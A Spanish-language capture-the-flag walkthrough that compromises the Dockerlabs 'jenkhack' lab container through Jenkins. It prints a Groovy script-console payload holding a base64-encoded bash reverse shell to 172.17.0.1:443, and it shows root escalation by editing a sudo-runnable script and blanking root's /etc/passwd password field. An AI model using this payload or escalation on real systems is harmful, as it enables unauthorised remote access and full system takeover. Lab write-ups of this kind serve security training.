Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh jenkhack.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
<ins>La dirección IP de la máquina a vulnerar siempre es la 172.17.0.2</ins>.

  ![image](https://github.com/user-attachments/assets/45e470e5-72ea-430e-b2d2-e041eda34332)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/user-attachments/assets/3ffe2470-909b-4bbe-9214-30491cfdad26)

Podemos ver que se encuentran abiertos los puertos ***80***, ***443*** y ***8080***, correspondientes a los servicios ***HTTP***, ***HTTPS*** y el ***servicio Jetty*** respectivamente.

Buscamos en el navegador la dirección http://172.17.0.2:80:

  ![image](https://github.com/user-attachments/assets/375f0110-2939-402a-92df-c4d248e6599e)

Miramos el código fuente de la página web en búsqueda de información importante:

  ![image](https://github.com/user-attachments/assets/2f51da53-89c0-4c38-a228-5dde3c734878)

Parece que  los valores de las etiquetas alt resaltadas pueden ser claves del servicio Jenkins, el cual corre por el puerto 8080 en el servidor.<br>
El nombre de usuario es "**jenkins-admin**" y su contraseña es "**cassandra**".

Nos vamos a la URL http://172.17.0.2:8080 e intentamos iniciar sesión con estas credenciales:

  ![image](https://github.com/user-attachments/assets/ba7807a7-beba-426e-83ee-78dd0b142623)

  ![image](https://github.com/user-attachments/assets/289c29ac-1a7b-484b-b5cb-996ba84fce59)

Logramos acceder de manera exitosa a la página web del servidor Jenkins.

Luego, vamos a intentar entrar en el sistema de la máquina víctima mediante ejecución de código remoto, lo que se conoce como un **ataque RCE** (*Remote Code Execution*).<br>
Para ello, escribimos en el buscador http://172.17.0.2:8080/script e insertamos el siguiente código malicioso:

**def cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYxCg==}|{base64,-d}|{bash,-i}"<br>
def process = cmd.execute()<br>
process.waitFor()**

Nos ponemos en escucha con NetCat por el puerto 443:

  ![image](https://github.com/user-attachments/assets/6cf484cb-d003-4be9-9075-1bbad77b4d96)
  
Hemos logrado acceder a la máquina vulnerable como el usuario "jenkins".<br>
Nuestra misión ahora es lograr realizar una escalada de privilegios que nos permita ingresar como el usuario root.

Miramos en el directorio *home* en búsqueda de otros usuarios existentes:

  ![image](https://github.com/user-attachments/assets/f2c76018-6fd0-4036-a98a-db2a29214bd3)
  
Hay un usuario llamado "jenkhack".<br>
Si buscamos algún archivo con ese nombre, encontraremos una carpeta que tiene una nota.<br> 
Para realizar la búsqueda ejecutamos **find / -name "jenkhack" 2>/dev/null** y leemos su contenido:

  ![image](https://github.com/user-attachments/assets/a50ab7e7-afb8-445c-aef4-e262b21a5562)

  ![image](https://github.com/user-attachments/assets/7be05ee9-4a94-4edb-9ffa-8a9434b89cd7)

La contraseña se encuentra encriptada, por lo que empleando [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base85('!-u',true,'z')) probamos a descifrarla, siendo el lenguaje de codificación utilizado el Base85.

  ![image](https://github.com/user-attachments/assets/dd13a9b3-5816-4161-9b7f-6ac34b705b2a)

La contraseña del usuario "jenkhack" es "**jenkinselmejor**".

Intentamos cambiar de usuario para seguir con la escalada de privilegios:

  ![image](https://github.com/user-attachments/assets/a9a5cc93-9f9b-4889-99f1-899bdfb04d79)

Habiendo accedido como el usuario "jenkhack", revisamos con el comando **sudo -l** los archivos binarios que puede ejecutar el usuario de manera privilegiada.

  ![image](https://github.com/user-attachments/assets/88c1d057-3559-46f5-9693-83a6ccfc33ac)
  
Podemos ejecutar el binario /usr/local/bin/bash como usuario root, sin necesidad de ingresar su contraseña.

Ejecutamos el archivo binario y nos damos cuenta de que se trata de un script de bash:

  ![image](https://github.com/user-attachments/assets/af2f2e37-f27d-429e-bf3b-9518d0eecdc0)

Editamos el script para lograr vulnerar el fichero /etc/passwd y así convertirnos en usuario root.

  ![image](https://github.com/user-attachments/assets/ab43a45c-77bf-4657-a402-0b8d5af79fd6)

  ![image](https://github.com/user-attachments/assets/d2346c4b-ecc6-49f3-a70c-8491cfed6524)

Luego, ejecutamos el script escribiendo en la CLI **sudo /usr/local/bin/bash** y visualizamos el resultado de arrancarlo:

  ![image](https://github.com/user-attachments/assets/9690207b-0204-457e-814d-88c9b03db3a7)

Modificamos la línea del /etc/passwd correspondiente a root, eliminado la "x".

  ![image](https://github.com/user-attachments/assets/48bf18a3-2dfd-4fad-8203-d3f2641433f8)

Finalmente, accedemos como el usuario root con el comando **su**.

  ![image](https://github.com/user-attachments/assets/66ee3603-6a29-48df-99f4-6bf4bec4cf1c)

Hemos logrado acceder como el usuario root, por lo que actualmente contamos con todos los privilegios existentes en el sistema.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/user-attachments/assets/058eb76d-0e60-4bd7-beed-3d45979896fc)
